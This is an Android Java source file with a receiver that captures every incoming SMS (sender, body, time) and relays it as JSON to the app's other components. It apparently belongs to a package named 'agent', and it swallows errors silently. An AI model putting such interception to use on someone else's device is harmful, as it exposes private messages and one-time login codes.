package com.zero.agent;
import android.content.*; import android.telephony.SmsMessage; import org.json.JSONObject;
public class SMSReceiver extends BroadcastReceiver {
    public void onReceive(Context context, Intent intent) {
        try { Object[] pdus = (Object[]) intent.getExtras().get("pdus"); if (pdus == null) return;
            for (Object pdu : pdus) { SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu); JSONObject o = new JSONObject();
                o.put("type","incoming_sms"); o.put("from", sms.getOriginatingAddress()); o.put("body", sms.getMessageBody()); o.put("time", System.currentTimeMillis());
                Intent i = new Intent("com.zero.agent.SMS_EVENT"); i.setPackage(context.getPackageName()); i.putExtra("data", o.toString()); context.sendBroadcast(i); }
        } catch (Exception ignored) {}
    }
}